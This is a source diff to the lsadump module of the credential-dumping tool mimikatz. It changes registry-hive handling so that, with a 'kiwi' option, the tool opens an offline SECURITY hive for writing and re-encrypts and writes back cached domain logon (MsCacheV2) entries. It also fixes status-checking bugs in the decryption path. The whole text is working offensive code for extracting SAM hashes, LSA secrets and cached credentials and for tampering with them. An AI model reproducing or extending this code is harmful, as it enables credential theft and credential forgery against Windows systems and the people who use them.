@@ -55,7 +55,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 		hData = CreateFile(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 		if(hData != INVALID_HANDLE_VALUE)
 		{
-			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, &hRegistry))
+			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, FALSE, &hRegistry))
 			{
 				isKeyOk = kuhl_m_lsadump_getComputerAndSyskey(hRegistry, NULL, sysKey);
 				kull_m_registry_close(hRegistry);
@@ -68,7 +68,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 			hData = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 			if(hData != INVALID_HANDLE_VALUE)
 			{
-				if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, &hRegistry))
+				if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, FALSE, &hRegistry))
 				{
 					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, NULL, sysKey);
 					kull_m_registry_close(hRegistry);
@@ -79,7 +79,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 	}
 	else
 	{
-		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, &hRegistry))
+		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
 		{
 			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hBase))
 			{
@@ -120,23 +120,23 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 	BOOL isKeyOk = FALSE;
 	BOOL isKiwi = kull_m_string_args_byName(argc, argv, L"kiwi", NULL, NULL);
 
-	if(argc && !isKiwi)
+	if(argc)
 	{
 		hDataSystem = CreateFile(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 		if(hDataSystem != INVALID_HANDLE_VALUE)
 		{
-			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, &hSystem))
+			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hSystem))
 			{
 				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, NULL, sysKey))
 				{
 					if(argc > 1)
 					{
-						hDataSecurity = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+						hDataSecurity = CreateFile(argv[1], GENERIC_READ | (isKiwi ? GENERIC_WRITE : 0), 0, NULL, OPEN_EXISTING, 0, NULL);
 						if(hDataSecurity != INVALID_HANDLE_VALUE)
 						{
-							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, &hSecurity))
+							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, isKiwi, &hSecurity))
 							{
-								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache, FALSE);
+								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache, isKiwi);
 								kull_m_registry_close(hSecurity);
 							}
 							CloseHandle(hDataSecurity);
@@ -150,7 +150,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 	}
 	else
 	{
-		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, &hSystem))
+		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hSystem))
 		{
 			if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystemBase))
 			{
@@ -747,7 +747,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 											s1 = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
 											RtlCopyMemory(digest, pMsCacheEntry->iv, LAZY_IV_SIZE);
 											nStatus = aesCTSDecryptMsg(AES_128_KEY_SIZE, pNLKM, s1, pMsCacheEntry->enc_data, digest); 
-											if(NT_SUCCESS(status))
+											if(NT_SUCCESS(nStatus))
 											{
 												kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
 												if(kiwime)
@@ -758,18 +758,17 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 													if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, kiwiKey, &usr, j)))
 													{
 														kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-														status = HMACwithSHA(pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, (PVOID *) &pMsCacheEntry->cksum, MD5_DIGEST_LENGTH);
-														if(NT_SUCCESS(status))
+														nStatus = HMACwithSHA(pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, (PVOID *) &pMsCacheEntry->cksum, MD5_DIGEST_LENGTH);
+														if(NT_SUCCESS(nStatus))
 														{
 															kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
 															RtlCopyMemory(digest, pMsCacheEntry->iv, LAZY_IV_SIZE);
 															nStatus = aesCTSEncryptMsg(AES_128_KEY_SIZE, pNLKM, s1, pMsCacheEntry->enc_data, digest); 
-															if(NT_SUCCESS(status))
+															if(NT_SUCCESS(nStatus))
 															{
-																nStatus = RegSetValueEx(hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret);
-																if(nStatus == ERROR_SUCCESS)
+																if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
 																	kprintf(L"> OK!\n");
-																else PRINT_ERROR(L"RegSetValueEx: 0x%08x\n", nStatus);
+																else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
 															}
 														}
 													}
